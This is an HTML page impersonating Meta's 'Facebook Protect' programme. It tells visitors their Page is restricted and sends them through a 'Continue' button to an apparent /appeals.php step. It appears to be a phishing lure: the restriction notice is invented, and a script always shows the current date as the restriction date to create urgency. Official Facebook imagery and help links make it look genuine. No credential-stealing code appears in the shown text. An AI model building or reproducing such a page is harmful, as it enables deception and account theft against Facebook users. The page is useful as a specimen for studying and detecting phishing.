<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Privacy Policy</title>
    <link rel="icon" href="imgs/fb_icon_325x325.png" type="image/x-icon">
    <meta name="csrf-token" content="lg9sxAhYtjIOS3udzoR9UaSlq7PHnic9MzQpf7N8">
    <meta property="og:image" content="https://i.imgur.com/dPbn7je.jpg">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            background-color: #f7f7f7;
            color: #333;
        }

        .container {
            width: 100%;
            max-width: 600px;
            margin: auto;
            padding-top: 50px;
        }

        .image-container {
            border-radius: 15px;
            overflow: hidden;
            margin-bottom: 20px;
        }

        .image-container img {
            display: block;
            margin: auto;
            width: 100%;
            height: auto;
        }

        .main-heading {
            font-weight: bold;
            font-size: 24px;
            margin-bottom: 15px;
        }

        .main-text {
            margin-bottom: 20px;
            font-size: 16px;
        }

        .main-text a {
            color: #007bff;
            text-decoration: none;
        }

        .main-text a:hover {
            text-decoration: underline;
        }



        .process-item {
            margin-bottom: 20px;
            position: relative;
        }

        .process-item span {
            position: absolute;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 30px;
            height: 30px;
            border-radius: 50%;
            left: -40px;
        }

        .process-item span svg {
            width: 15px;
            height: 15px;
            color: #fff;
        }

        .process-item h3 {
            font-weight: bold;
            margin-left: 0;
            font-size: 16px;
        }

        .continue-button {
            display: block;
            width: 100%;
            padding: 10px 0px 10px 0px;
            background-color: #007bff;
            color: #fff;
            text-align: center;
            text-decoration: none;
            border-radius: 8px;
            font-weight: bold;
            margin-top: 20px;
        }

        .date-text {
            text-align: center;
            margin-top: 10px;
            margin-bottom: 20px;
        }

        ol {
            list-style-type: none;
        }
        @media only screen and (max-width: 768px) {
    .container {
        max-width: 100%;
    }
}

    </style>
</head>

<body>
<div class="container">
    <div class="image-container">
        <img src="https://about.fb.com/wp-content/uploads/2021/12/NRP-Expanding-Facebook-Protect-to-the-World_Header.jpg?fit=1920%2C1080" alt="Facebook Protect" />
    </div>

    <p class="main-heading">Welcome To Facebook Protect.</p>
    <p class="main-text">Your page's accessibility is limited, so we ask that higher security requirements be applied to that account. We created this security program to unlock your Pages.
        <a href="https://www.facebook.com/help" target="_blank">More information</a>
    </p>

    <div class="process-list">
        <ol class="text-gray-500 border-s-2 border-gray-200">
            <li class="process-item">
                    <span style="background-color: #c4c4c4;">
                        <svg aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 16 12">
                            <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M1 5.917 5.724 10.5 15 1.5"></path>
                        </svg>
                    </span>
                <h3>We've enabled advanced protections to unlock your Page.</h3>
            </li>
            <li class="process-item">
                    <span style="background-color: #1877f2;">
                        <svg aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 20 16">
                            <path d="M18 0H2a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V2a2 2 0 0 0-2-2ZM6.5 3a2.5 2.5 0 1 1 0 5 2.5 2.5 0 0 1 0-5ZM3.014 13.021l.157-.625A3.427 3.427 0 0 1 6.5 9.571a3.426 3.426 0 0 1 3.322 2.805l.159.622-6.967.023ZM16 12h-3a1 1 0 0 1 0-2h3a1 1 0 0 1 0 2Zm0-3h-3a1 1 0 1 1 0-2h3a1 1 0 1 1 0 2Zm0-3h-3a1 1 0 1 1 0-2h3a1 1 0 1 1 0 2Z"></path>
                        </svg>
                    </span>
                <h3>Below, we walk you through the process in detail and help you fully activate to unlock your Page.</h3>
            </li>
        </ol>
    </div>

    <a href="/appeals.php" class="continue-button">Continue</a>
    <p class="date-text">Your page was restricted on <strong id="currentDate"></strong>.</p>
</div>

<script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
<script nomodule="" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
<script type="text/javascript">
    document.getElementById('currentDate').textContent = getCurrentDate();

function getCurrentDate() {
    const options = { year: 'numeric', month: 'long', day: 'numeric' };
    return new Date().toLocaleDateString('en-US', options);
}
</script>
</body>

</html>
